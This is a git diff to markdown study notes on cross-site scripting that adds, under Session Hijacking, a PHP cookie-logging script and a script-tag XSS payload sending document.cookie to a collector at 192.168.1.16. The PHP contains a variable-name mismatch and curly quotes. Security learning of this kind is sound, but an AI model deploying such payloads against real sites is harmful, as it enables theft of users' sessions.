@@ -4,9 +4,7 @@
 - Reflected
 - Stored
 - DOM Based
-  - هیچ اطلاعاتی به سمت سرور ارسال نمی شود که این در Burp قابل بررسی است
-  
-  - Javascript functions types
+  - Nothing send to server (check with Burp), instead use both Javascript functions types simultaneously:
     - source
       - ```?name=alireza => document.url()```
     - sink 
@@ -16,7 +14,23 @@
 
 ## Exploitation
 - Session Hijacking
+  - Cookie Stealer (PHP for Apache web server)
+```PHP
+<?php
+$Cookie=$_GET[‘txt’];
+$log=”Cookie=$cookie\r\n”;
+$f=fopen(“log.txt”,”a”);
+fwrite($f,$log);
+?>
+```
+  - XSS Payload
+```javascript
+<script>window.location=”http://192.168.1.16/cookie1.php?txt=” + document.cookie;</script>
+```
+
 - Fake Page
+  - g
+
 - [BeEF](../Tools/beef.md)
 
 ## Mitigation
